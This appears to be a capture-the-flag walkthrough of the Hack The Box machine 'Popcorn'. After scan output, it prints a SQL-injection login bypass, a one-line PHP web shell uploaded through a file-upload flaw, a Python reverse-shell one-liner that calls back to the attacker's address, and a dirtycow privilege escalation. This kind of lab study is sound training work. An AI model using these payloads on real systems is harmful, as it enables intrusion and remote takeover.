# Popcorn

## Information Gathering
10.10.10.6<br>
Popcorn<br>

Software Versions
- Apache/2.2.12
- OpenSSH 5.1p1

## Enumeration
Of course start with your nmap scan:
```bash
# Nmap 7.92 scan initiated Fri Feb 25 19:12:47 2022 as: nmap -p- -A -oN nmap/all_ports.nmap 10.10.10.6
Nmap scan report for 10.10.10.6
Host is up (0.027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html).
|_http-server-header: Apache/2.2.12 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/25%OT=22%CT=1%CU=39829%PV=Y%DS=2%DC=T%G=Y%TM=621970A
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=C7%GCD=1%ISR=C8%TI=Z%CI=Z%II=I%TS=8)OPS(O
OS:1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11N
OS:W6%O6=M505ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R
OS:=Y%DF=Y%T=40%W=16D0%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M505ST11NW6%RD=0%
OS:Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIP
OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   26.73 ms 10.10.14.1
2   26.77 ms 10.10.10.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 25 19:13:20 2022 -- 1 IP address (1 host up) scanned in 32.85 seconds

```
I run a Gobuster scan on the webserver:
```bash
/index                (Status: 200) [Size: 177]
/index.html           (Status: 200) [Size: 177]
/test.php             (Status: 200) [Size: 47048]
/test                 (Status: 200) [Size: 47036]
/torrent              (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/]
/rename               (Status: 301) [Size: 309] [--> http://10.10.10.6/rename/]
```
I also run a Nikto scan on the webserver:
```bash
- Nikto v2.1.6/2.1.5
+ Target Host: 10.10.10.6
+ Target Port: 80
+ GET Server may leak inodes via ETags, header found with file /, inode: 43621, size: 177, mtime: Fri Mar 17 13:07:05 2017
+ GET The anti-clickjacking X-Frame-Options header is not present.
+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ HEAD Apache/2.2.12 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ GET Uncommon header 'tcn' found, with contents: list
+ GET Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ GET Retrieved x-powered-by header: PHP/5.2.10-2ubuntu6.10
+ GET /test: Output from the phpinfo() function was found.
+ OSVDB-112004: GET /test: Site appears vulnerable to the 'shellshock' vulnerability (CVE-2014-6271).
+ OSVDB-112004: GET /test: Site appears vulnerable to the 'shellshock' vulnerability (CVE-2014-6278).
+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ GET /test.php: Output from the phpinfo() function was found.
+ GET /test/: Output from the phpinfo() function was found.
+ OSVDB-3092: GET /test/: This might be interesting...
+ GET /test/jsp/buffer1.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/buffer2.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/buffer3.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/buffer4.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/declaration/IntegerOverflow.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/extends1.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/extends2.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/Language.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/pageAutoFlush.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/pageDouble.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/pageExtends.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/pageImport2.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/pageInfo.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/pageInvalid.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/pageIsErrorPage.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/pageIsThreadSafe.jsp: Output from the phpinfo() function was found.
+ GET /test/jsp/pageSession.jsp: Output from the phpinfo() function was found.
+ GET /test/realPath.jsp: Output from the phpinfo() function was found.
+ OSVDB-3233: GET /test.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ GET /test/phpinfo.php: Output from the phpinfo() function was found.
+ OSVDB-3233: GET /test/phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ GET /test/phpinfo.php3: Output from the phpinfo() function was found.
+ OSVDB-3233: GET /test/phpinfo.php3: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ GET /test/test.php: Output from the phpinfo() function was found.
+ OSVDB-3233: GET /test/test.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ GET /test/info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: GET /test/info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ GET /test/index.php: Output from the phpinfo() function was found.
+ OSVDB-3233: GET /test/index.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ GET /test/php_info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: GET /test/php_info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3268: GET /icons/: Directory indexing found.
+ OSVDB-3233: GET /icons/README: Apache default file found.
+ OSVDB-3092: GET /test.php: This might be interesting...

```

## Exploitation
Navigating to /torrent gives you a page for a torrent hosting website: Torrent Hoster. There is a login portal and I try the classic <b>' OR 1=1-- - </b> in the username POST parameter and become authenticated as admin. Nice! After a bit of Googling I find that the web aplication is vulnerable to a Arbitrary File Upload vulnerability. https://www.exploit-db.com/exploits/11746<br><br>
The first step is to navigate to  http://10.10.10.6/torrenthoster//torrents.php?mode=upload. A few things need to happen to perform this file upload vulnerability. Fortunatly, there is already an image for us to abuse but if there wasn't it would be as simple to upload one. Once you have a torrent, click "Edit this Torrent". Make sure to open a Proxy to capture and modify the HTTP request. <a href="https://book.hacktricks.xyz/pentesting-web/file-upload">This</a> checklist is a good one to follow. Update some arbitrary screenshot (prefereably in an acceptable format to do less editing) and capture the request in a proxy. I make the changes and use the payload:
```php
<?php system($_GET['cmd']) ?>
```
Addding the .php extension seems to enough to bypasss the upload filter.<br><br>
After that you can serve the request by navigating to http://10.10.10.6/torrent/upload/ and selecting the file withs the .php extension. After a bit of enumerating and determing what software was on the box I used the payload
```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.122",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
Starting a reverse shell and serving this request should yield a reverse shell.

## Privilege Escalation
After a bit of enumeration (maybe a bit too much) I find that the server is running a very old Linux kernel. I run linux-exploit-suggester.sh to verify that this box is vulnerable to dirtyc0w.c. After downloading <a href="https://www.exploit-db.com/exploits/40839">this</a> dirtyc0w.c exploit and compiling it I pivot over to <b>firefart</b> (the root user created by dirtyc0w.c) and become root. 